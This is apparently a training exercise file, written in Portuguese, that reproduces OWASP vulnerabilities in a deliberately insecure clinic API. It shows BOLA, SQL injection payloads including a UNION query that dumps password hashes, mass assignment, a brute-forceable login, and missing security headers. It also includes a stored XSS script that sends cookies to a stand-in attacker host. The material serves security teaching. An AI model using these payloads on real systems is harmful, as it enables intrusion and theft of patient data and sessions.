@@ -1,0 +1,195 @@
+====================================================================================================
+EXERCÍCIO 8 - Reprodução das vulnerabilidades (router /inseguro, CLINICA_MODO_DEMONSTRACAO_INSEGURA=true)
+====================================================================================================
+
+V1 - A01 BOLA: o paciente João (consulta 1) troca o id na URL e lê a consulta da paciente Maria.
+
+> GET /inseguro/consultas/1
+> Authorization: Bearer <token paciente João>
+< HTTP 200
+{
+  "id": 1,
+  "paciente_id": 1,
+  "paciente_nome": "João Batista",
+  "profissional_id": 1,
+  "profissional_nome": "Dra. Helena Prado",
+  "inicio": "2026-10-03T09:00:00",
+  "duracao_minutos": 30,
+  "status": "agendada",
+  "motivo": "Dor no peito ao esforço, avaliar ECG",
+  "observacoes": "Trazer exames anteriores"
+}
+
+> GET /inseguro/consultas/2
+> Authorization: Bearer <token paciente João>
+< HTTP 200
+{
+  "id": 2,
+  "paciente_id": 2,
+  "paciente_nome": "Maria Fernandes",
+  "profissional_id": 2,
+  "profissional_nome": "Dr. Marcos Teixeira",
+  "inicio": "2026-10-03T10:00:00",
+  "duracao_minutos": 30,
+  "status": "agendada",
+  "motivo": "Lesão de pele suspeita no braço esquerdo",
+  "observacoes": "Paciente prefere contato por e-mail"
+}
+
+V2 - A03 SQL injection: o termo de busca é concatenado no SQL.
+
+> GET /inseguro/pacientes/busca?nome=Pedro
+> Authorization: Bearer <token Recepção>
+< HTTP 200
+[
+  {
+    "id": 3,
+    "nome": "Pedro Albuquerque",
+    "cpf": "186.091.390-34",
+    "email": "pedro@paciente.dev"
+  }
+]
+
+> GET /inseguro/pacientes/busca?nome=%27+OR+%271%27%3D%271
+> Authorization: Bearer <token Recepção>
+< HTTP 200
+[
+  {
+    "id": 1,
+    "nome": "João Batista",
+    "cpf": "526.018.159-06",
+    "email": "joao@paciente.dev"
+  },
+  {
+    "id": 2,
+    "nome": "Maria Fernandes",
+    "cpf": "083.016.613-05",
+    "email": "maria@paciente.dev"
+  },
+  {
+    "id": 3,
+    "nome": "Pedro Albuquerque",
+    "cpf": "186.091.390-34",
+    "email": "pedro@paciente.dev"
+  }
+]
+
+> GET /inseguro/pacientes/busca?nome=x%27+UNION+SELECT+id%2C+email%2C+senha_hash%2C+papel+FROM+usuario+--
+> Authorization: Bearer <token Recepção>
+< HTTP 200
+[
+  {
+    "id": 1,
+    "nome": "admin@clinica.dev",
+    "cpf": "$2b$12$fwB2FDZ9Gj0AymHy.RkmquA2JSi9iEcxGAeIUT/NI6cB4i6LYRw56",
+    "email": "administrador"
+  },
+  {
+    "id": 2,
+    "nome": "recepcao@clinica.dev",
+    "cpf": "$2b$12$BTq.nr9QnFgoXbBGM2vtNu4Pgdz1s5baw9aUKIYc8gCc9zeWPxz2.",
+    "email": "recepcionista"
+  },
+  {
+    "id": 3,
+    "nome": "helena@clinica.dev",
+    "cpf": "$2b$12$Vl3JjiAI8TU9lkKrYO8efuPk2p6SL0KkiefsQXcTtcheB08sld93y",
+    "email": "profissional"
+  },
+  {
+    "id": 4,
+    "nome": "marcos@clinica.dev",
+    "cpf": "$2b$12$m267d2ro5w/FB.lEjQR1ZOYXNaZM/ySKXPNvqBltIyhT1Ls9.60iO",
+    "email": "profissional"
+  },
+  {
+    "id": 5,
+    "nome": "joao@paciente.dev",
+    "cpf": "$2b$12$Yb85/qgxz7ZvNSwYL9Ivp.B7VNkB9aSVJ/1qNa20rKuQb3dX5supy",
+    "email": "paciente"
+  },
+  {
+    "id": 6,
+    "nome": "maria@paciente.dev",
+    "cpf": "$2b$12$EJ.EU/sX7rkZ8zNE3EkKXeQJO7stdgJ9dtcM5n0uL7omIDmq5ltY.",
+    "email": "paciente"
+  }
+]
+
+V3 - A04 mass assignment: o corpo da requisição sobrescreve profissional_id, criado_por_id e token_auditoria.
+
+> POST /inseguro/consultas
+> Authorization: Bearer <token Dra. Helena>
+> corpo (json): {"paciente_id": 2, "inicio": "2026-10-04T17:00:00", "motivo": "Consulta forjada", "profissional_id": 2, "criado_por_id": 4, "token_auditoria": "aud_forjado"}
+< HTTP 201
+{
+  "inicio": "2026-10-04T17:00:00",
+  "id": 5,
+  "status": "agendada",
+  "observacoes": "",
+  "criado_por_id": 4,
+  "atualizado_em": "2026-10-04T00:28:50.308576+00:00",
+  "profissional_id": 2,
+  "duracao_minutos": 30,
+  "paciente_id": 2,
+  "motivo": "Consulta forjada",
+  "token_auditoria": "aud_forjado",
+  "criado_em": "2026-10-04T00:28:50.308574+00:00",
+  "ip_origem": ""
+}
+
+V4 - A03 XSS armazenado: a observação gravada pela profissional chega crua na agenda vulnerável (filtro |safe).
+
+> PUT /consultas/1
+> Authorization: Bearer <token Dra. Helena>
+> corpo (json): {"inicio": "2026-10-04T09:00:00", "duracao_minutos": 30, "status": "agendada", "motivo": "Dor no peito", "observacoes": "<script>fetch('https://atacante.exemplo/?c='+document.cookie)</script>"}
+< HTTP 200
+{
+  "id": 1,
+  "paciente_id": 1,
+  "paciente_nome": "João Batista",
+  "profissional_id": 1,
+  "profissional_nome": "Dra. Helena Prado",
+  "inicio": "2026-10-04T09:00:00",
+  "duracao_minutos": 30,
+  "status": "agendada",
+  "motivo": "Dor no peito",
+  "observacoes": "<script>fetch('https://atacante.exemplo/?c='+document.cookie)</script>"
+}
+
+Trecho da página /inseguro/web/agenda:
+<td><script>fetch('https://atacante.exemplo/?c='+document.cookie)</script></td>
+
+V5 - A07 login sem limite, sem bloqueio e com mensagem que revela se o e-mail existe:
+  tentativa 1: HTTP 401 Senha incorreta
+  tentativa 2: HTTP 401 Senha incorreta
+  tentativa 3: HTTP 401 Senha incorreta
+  tentativa 4: HTTP 401 Senha incorreta
+  tentativa 5: HTTP 401 Senha incorreta
+  tentativa 6: HTTP 401 Senha incorreta
+  tentativa 7: HTTP 401 Senha incorreta
+  tentativa 8: HTTP 401 Senha incorreta
+  e-mail inexistente: HTTP 401 Usuário não cadastrado
+  administrador sem MFA: HTTP 200 -> token emitido sem segundo fator
+
+V6 - A05 configuração: respostas do router vulnerável sem cabeçalhos de segurança.
+
+> GET /inseguro/consultas/1
+> Authorization: Bearer <token paciente João>
+< HTTP 200
+< strict-transport-security: <ausente>
+< x-frame-options: <ausente>
+< x-content-type-options: <ausente>
+< content-security-policy: <ausente>
+{
+  "id": 1,
+  "paciente_id": 1,
+  "paciente_nome": "João Batista",
+  "profissional_id": 1,
+  "profissional_nome": "Dra. Helena Prado",
+  "inicio": "2026-10-04T09:00:00",
+  "duracao_minutos": 30,
+  "status": "agendada",
+  "motivo": "Dor no peito",
+  "observacoes": "<script>fetch('https://atacante.exemplo/?c='+document.cookie)</script>"
+}
